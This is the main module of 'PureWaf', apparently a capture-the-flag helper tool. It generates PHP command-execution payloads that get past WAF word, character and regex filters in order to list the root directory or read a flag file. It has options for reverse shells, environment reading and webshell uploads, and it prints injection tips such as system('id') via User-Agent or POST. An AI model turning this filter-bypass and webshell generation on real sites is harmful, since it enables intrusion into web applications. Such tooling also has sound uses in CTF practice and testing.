# main package

import importlib
import logging
import os
import sys
import time
import urllib.parse
from dataclasses import dataclass
from typing import List

from . import bypass
from . import bypass_data
from . import utils

version = "1.2.1"

SPECIAL_UPLOAD_POC_PAYLOAD = bypass_data.SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS[1]
SPECIAL_UPLOAD_POC_EGS = bypass_data.SPECIAL_UPLOAD_POC_EGS
BACKTRACK_LIMIT_POC_EGS = bypass_data.BACKTRACK_LIMIT_POC_EGS

WEBUI_MIN_PYTHON = (3, 9)
WEBUI_FLASK_SPEC = "flask>=3.1,<4"
WEBUI_INSTALL_COMMAND = f'pip install "{WEBUI_FLASK_SPEC}"'


@dataclass(frozen=True)
class PureWafConfig:
    waf_words: str = ""
    waf_chars: str = ""
    waf_regex: str = ""
    payload_context: str = "any"
    limit_length: int = 999999
    flagfile: str = "/flag"
    read_env: bool = False
    reflect_shell: bool = False
    port: int = 8080
    ip: str = "127.0.0.1"
    phpinfo: bool = False
    upload: bool = False
    log_level: str = "INFO"
    total_payload: bool = False
    phpv: float = 7.0
    auto: bool = False
    webui: bool = False


@dataclass
class PureWafExecutionResult:
    shortest_root: str
    shortest_flag: str
    root_passed_payloads: List[str]
    flag_passed_payloads: List[str]
    tips_text: str
    log_text: str


def banner(version_text):
    return rf"""
 ____                      __        __     ___
|  _ \ _   _ _ __ ___      \ \      / /_ _ |  _|
| |_) | | | | '__/ _ \      \ \ /\ / / _` /| |_
|  __/| |_| | | | (_) |      \ V  V / (_| \|  _|
|_|    \__,_|_|  \___/        \_/\_/ \__,_||_|

    [ PureWaf :: Pure You Hate ]
    [ Author  :: Pure Stream ]
    [ Version :: {version_text}]
    [ Github  :: https://github.com/PureStream108/PureWaf ]


"""


class _ExecutionLogger:
    def __init__(self, forward_logger=None, event_callback=None):
        self.forward_logger = forward_logger
        self.event_callback = event_callback
        self.messages = []

    def info(self, message):
        self._emit("info", message)

    def warning(self, message):
        self._emit("warning", message)

    def error(self, message):
        self._emit("error", message)

    def _emit(self, level, message):
        text = str(message)
        self.messages.append(text)
        if self.forward_logger:
            getattr(self.forward_logger, level)(text)
        _emit_event(
            self.event_callback,
            {
                "type": "log",
                "level": level,
                "message": text,
            },
        )


def _emit_event(event_callback, event):
    if event_callback:
        event_callback(event)


def _configure_logger(log_level: str):
    logger = logging.getLogger("PureWaf")
    if not logger.handlers:
        handler = logging.StreamHandler(sys.stdout)
        formatter = logging.Formatter("%(message)s")
        handler.setFormatter(formatter)
        logger.addHandler(handler)

    level_name = (log_level or "INFO").upper()
    if level_name not in ["DEBUG", "INFO", "QUIET"]:
        logger.warning("[!] Invalid log level, using INFO instead.")
        level_name = "INFO"

    show_progress = True
    if level_name == "QUIET":
        logger.setLevel(logging.CRITICAL)
        sys.stdout = open(os.devnull, "w")
        show_progress = False
    else:
        logger.setLevel(getattr(logging, level_name))

    if level_name != "DEBUG":
        import warnings

        warnings.filterwarnings("ignore")

    return logger, show_progress


def _emit_special_payload_egs(logger, payload):
    if payload not in bypass_data.SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS:
        return
    logger.info("Example: ")
    for line in bypass_data.SPECIAL_UPLOAD_POC_EGS.splitlines():
        logger.info(line)


def _extract_regex_pattern(waf_regex: str):
    if not waf_regex:
        return ""
    pattern = waf_regex.strip()
    if pattern.startswith("/") and pattern.count("/") >= 2:
        last = pattern.rfind("/")
        return pattern[1:last]
    return pattern


def _looks_like_backtrack_risk_regex(waf_regex: str):
    pattern = _extract_regex_pattern(waf_regex)
    if not pattern:
        return False

    lowered = pattern.lower()
    if "(?r)" in lowered or "(?0)" in lowered:
        return True

    has_anchors = "^" in pattern and "$" in pattern
    has_greedy_prefix = ".*(" in pattern or ".+(" in pattern
    has_repeat = "*" in pattern or "+" in pattern or "{" in pattern
    has_wide_class = r"\w" in pattern or r"\W" in pattern

    return has_anchors and has_greedy_prefix and has_repeat and has_wide_class


def _emit_contextual_tips(logger, payload, waf_regex):
    _emit_special_payload_egs(logger, payload)

    if payload in bypass_data.HEADER_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: User-Agent: 1=system('id');")
        logger.info("TIPS: User-Agent: system('id');")

    if payload in bypass_data.VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: POST: 1=system('id');")

    if payload in bypass_data.ASSERT_POST_TIP_TRIGGER_PAYLOADS:
        logger.info("TIPS: POST: 2=system('id');")

    if payload == utils.generate_nan_seed_post_gateway():
        logger.info("TIPS: POST: 0=assert")
        logger.info("TIPS: POST: 1=system('id');")

    if _looks_like_backtrack_risk_regex(waf_regex):
        logger.info("Example:")
        for line in BACKTRACK_LIMIT_POC_EGS.splitlines():
            logger.info(line)


def _is_upload_payload(payload: str):
    candidates = [payload]
    try:
        once = urllib.parse.unquote(payload)
    except Exception:
        once = payload
    candidates.append(once)
    try:
        twice = urllib.parse.unquote(once)
    except Exception:
        twice = once
    candidates.append(twice)

    for text in candidates:
        normalized = text.strip().lower()
        if normalized.startswith("<?"):
            return True
        if normalized.startswith("<%"):
            return True
        if normalized.startswith('<script language="php">'):
            return True
        if normalized.startswith("gif89a<?"):
            return True
        if normalized.startswith("gif89a<%"):
            return True
        if normalized.startswith('gif89a<script language="php">'):
            return True
    return False


def _choose_upload_payload(passed_payloads, prefer_order=False):
    wrapped = [payload for payload in passed_payloads if _is_upload_payload(payload)]
    if not wrapped:
        return "N/A"

    raw_wrapped = []
    for payload in wrapped:
        try:
            decoded = urllib.parse.unquote(payload)
        except Exception:
            decoded = payload
        if decoded == payload:
            raw_wrapped.append(payload)

    if raw_wrapped:
        if prefer_order:
            return raw_wrapped[0]
        return min(raw_wrapped, key=len)
    if prefer_order:
        return wrapped[0]
    return min(wrapped, key=len)


def _choose_shortest_payload(passed_payloads, upload: bool, prefer_order=False):
    if not passed_payloads:
        return "N/A"
    if upload:
        return _choose_upload_payload(passed_payloads, prefer_order=prefer_order)
    return min(passed_payloads, key=len)


def _normalize_php_version(phpv, logger):
    try:
        return float(phpv)
    except (ValueError, TypeError):
        logger.error(f"[!] Invalid php_version: {phpv}. Using default 7.0")
        return 7.0


def _log_configuration(logger, config: PureWafConfig, phpv: float):
    logger.info("")
    logger.info("-" * 40)
    logger.info("[*] Configuration:")
    logger.info(f"    - waf_words: {config.waf_words}")
    logger.info(f"    - waf_chars: {config.waf_chars}")
    logger.info(f"    - waf_regex: {config.waf_regex}")
    logger.info(f"    - payload_context: {config.payload_context}")
    logger.info(f"    - limit_length: {config.limit_length}")
    logger.info(f"    - flagfile: {config.flagfile}")
    logger.info(f"    - read_env: {config.read_env}")
    logger.info(f"    - reflect_shell: {config.reflect_shell}")
    logger.info(f"    - upload: {config.upload}")
    logger.info(f"    - port: {config.port}")
    logger.info(f"    - ip: {config.ip}")
    logger.info(f"    - phpinfo: {config.phpinfo}")
    logger.info(f"    - phpv: {phpv}")
    logger.info(f"    - log_level: {config.log_level}")
    logger.info(f"    - total_payload: {config.total_payload}")
    logger.info("-" * 40)
    logger.info("")


def _build_filter_progress_callback(event_callback, scope: str, phase: str):
    if not event_callback:
        return None

    def callback(event):
        event_payload = dict(event)
        event_payload["scope"] = scope
        event_payload["phase"] = phase
        _emit_event(event_callback, event_payload)

    return callback


def _build_filter_trace_callback(event_callback, scope: str, phase: str):
    if not event_callback:
        return None

    def callback(event):
        event_payload = dict(event)
        event_payload["scope"] = scope
        event_payload["phase"] = phase
        _emit_event(event_callback, event_payload)

    return callback


def _emit_candidate_events(event_callback, scope: str, phase: str, scope_label: str, payloads):
    if not event_callback:
        return

    total = len(payloads)
    _emit_event(
        event_callback,
        {
            "type": "stage",
            "scope": scope,
            "phase": phase,
            "message": f"[*] {scope_label} {phase} payloads: {total}",
        },
    )
    for idx, payload in enumerate(payloads, start=1):
        _emit_event(
            event_callback,
            {
                "type": "candidate",
                "scope": scope,
                "phase": phase,
                "current": idx,
                "total": total,
                "payload": payload,
            },
        )


def _process_payload_scope(
    scope_key: str,
    scope_label: str,
    options,
    waf_words_list,
    waf_chars_set,
    waf_regex_obj,
    config: PureWafConfig,
    strategies,
    logger,
    show_progress: bool,
    event_callback=None,
):
    logger.info(f"[*] Generating payloads for {scope_label}...")

    base_payloads = bypass.generate_candidates(options)
    if not base_payloads:
        logger.warning(f"[!] No base payloads generated for {scope_label}.")
        return "N/A", []
    _emit_candidate_events(event_callback, scope_key, "base", scope_label, base_payloads)

    targeted_payloads = bypass._build_targeted_candidates(
        base_payloads,
        waf_words_list,
        waf_chars_set,
        waf_regex_obj,
    )
    _emit_candidate_events(event_callback, scope_key, "targeted", scope_label, targeted_payloads)
    passed_payloads = bypass.filter_payloads(
        targeted_payloads,
        waf_words_list,
        waf_chars_set,
        waf_regex_obj,
        config.limit_length,
        show_progress=show_progress,
        verbose=config.total_payload,
        progress_callback=_build_filter_progress_callback(event_callback, scope_key, "targeted"),
        trace_callback=_build_filter_trace_callback(event_callback, scope_key, "targeted"),
    )
    shortest_payload = _choose_shortest_payload(
        passed_payloads,
        config.upload,
        prefer_order=False,
    )
    final_passed_payloads = passed_payloads

    if shortest_payload == "N/A":
        _emit_event(
            event_callback,
            {
                "type": "stage",
                "scope": scope_key,
                "phase": "encoded_fallback",
                "message": f"[*] Trying encoded payload fallback for {scope_label}...",
            },
        )
        encoded_payloads = bypass.apply_encodings(base_payloads, strategies)
        _emit_candidate_events(event_callback, scope_key, "encoded", scope_label, encoded_payloads)
        fallback_passed_payloads = bypass.filter_payloads(
            encoded_payloads,
            waf_words_list,
            waf_chars_set,
            waf_regex_obj,
            config.limit_length,
            show_progress=show_progress,
            verbose=config.total_payload,
            progress_callback=_build_filter_progress_callback(event_callback, scope_key, "fallback"),
            trace_callback=_build_filter_trace_callback(event_callback, scope_key, "fallback"),
        )
        shortest_payload = _choose_shortest_payload(
            fallback_passed_payloads,
            config.upload,
            prefer_order=False,
        )
        if fallback_passed_payloads:
            final_passed_payloads = fallback_passed_payloads

    if shortest_payload == "N/A":
        if config.upload:
            logger.warning(f"[!] No wrapped payload passed WAF filters for {scope_label}.")
        else:
            logger.warning(f"[!] No payload passed WAF filters for {scope_label}.")

    return shortest_payload, final_passed_payloads


def _execute_purewaf(
    config: PureWafConfig,
    output_logger=None,
    show_progress=True,
    sleep_before_run=True,
    event_callback=None,
):
    logger = _ExecutionLogger(forward_logger=output_logger, event_callback=event_callback)

    logger.info(banner(version).rstrip())
    if sleep_before_run:
        time.sleep(1)

    phpv = _normalize_php_version(config.phpv, logger)
    _log_configuration(logger, config, phpv)

    waf_words_list = utils.parse_waf_words(config.waf_words)
    waf_chars_set = utils.parse_waf_chars(config.waf_chars)
    waf_regex_obj = utils.parse_waf_regex(config.waf_regex)
    strategies = utils.get_encoding_strategies()

    options_root = bypass.BypassOptions(
        flagfile="/",
        read_env=False,
        reflect_shell=False,
        ip=config.ip,
        port=config.port,
        phpinfo=False,
        php_version=phpv,
        upload=config.upload,
        payload_context=config.payload_context,
    )

    options_flag = bypass.BypassOptions(
        flagfile=config.flagfile,
        read_env=config.read_env,
        reflect_shell=config.reflect_shell,
        ip=config.ip,
        port=config.port,
        phpinfo=config.phpinfo,
        php_version=phpv,
        upload=config.upload,
        payload_context=config.payload_context,
    )

    shortest_root, root_passed_payloads = _process_payload_scope(
        "root",
        "Root Directory",
        options_root,
        waf_words_list,
        waf_chars_set,
        waf_regex_obj,
        config,
        strategies,
        logger,
        show_progress,
        event_callback=event_callback,
    )

    logger.info("")

    shortest_flag, flag_passed_payloads = _process_payload_scope(
        "flag",
        "Flag File",
        options_flag,
        waf_words_list,
        waf_chars_set,
        waf_regex_obj,
        config,
        strategies,
        logger,
        show_progress,
        event_callback=event_callback,
    )

    logger.info("")
    logger.info("-" * 40)
    logger.info(f"[+] Shortest Root Payload : {shortest_root}")
    logger.info(f"[+] Shortest Flag Payload : {shortest_flag}")
    logger.info("-" * 40)
    logger.info("")

    tips_logger = _ExecutionLogger(forward_logger=logger, event_callback=event_callback)
    _emit_contextual_tips(tips_logger, shortest_flag, config.waf_regex)
    logger.info("")

    return PureWafExecutionResult(
        shortest_root=shortest_root,
        shortest_flag=shortest_flag,
        root_passed_payloads=root_passed_payloads,
        flag_passed_payloads=flag_passed_payloads,
        tips_text="\n".join(tips_logger.messages),
        log_text="\n".join(logger.messages),
    )


def _launch_webui(config: PureWafConfig):
    if sys.version_info < WEBUI_MIN_PYTHON:
        current_version = ".".join(str(part) for part in sys.version_info[:3])
        minimum_version = ".".join(str(part) for part in WEBUI_MIN_PYTHON)
        raise RuntimeError(
            "Web UI requires Python "
            f"{minimum_version}+; current Python is {current_version}. "
            f"Install {WEBUI_FLASK_SPEC} on Python {minimum_version}+."
        )
    try:
        webui_module = importlib.import_module(".webui", package=__package__)
    except ModuleNotFoundError as exc:
        missing_name = exc.name or ""
        if missing_name.startswith("flask"):
            raise RuntimeError(
                "Web UI dependencies are incomplete or outdated. "
                f"Current Python is {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}. "
                f"Install or upgrade them with: {WEBUI_INSTALL_COMMAND}"
            ) from exc
        raise
    webui_module.launch_webui(config)


def purewaf(
    waf_words="",
    waf_chars="",
    waf_regex="",
    payload_context="any",
    limit_length=999999,
    flagfile="/flag",
    read_env=False,
    reflect_shell=False,
    port=8080,
    ip="127.0.0.1",
    phpinfo=False,
    upload=False,
    log_level="INFO",
    total_payload=False,
    phpv=7.0,
    auto=False,
    webui=False,
):
    if auto and not webui:
        raise RuntimeError("auto=True can only be used together with webui=True.")

    config = PureWafConfig(
        waf_words=waf_words,
        waf_chars=waf_chars,
        waf_regex=waf_regex,
        payload_context=payload_context,
        limit_length=limit_length,
        flagfile=flagfile,
        read_env=read_env,
        reflect_shell=reflect_shell,
        port=port,
        ip=ip,
        phpinfo=phpinfo,
        upload=upload,
        log_level=log_level,
        total_payload=total_payload,
        phpv=phpv,
        auto=auto,
        webui=webui,
    )

    if config.webui:
        _launch_webui(config)
        return None

    output_logger, show_progress = _configure_logger(config.log_level)
    result = _execute_purewaf(
        config,
        output_logger=output_logger,
        show_progress=show_progress,
        sleep_before_run=True,
    )
    return result.shortest_flag
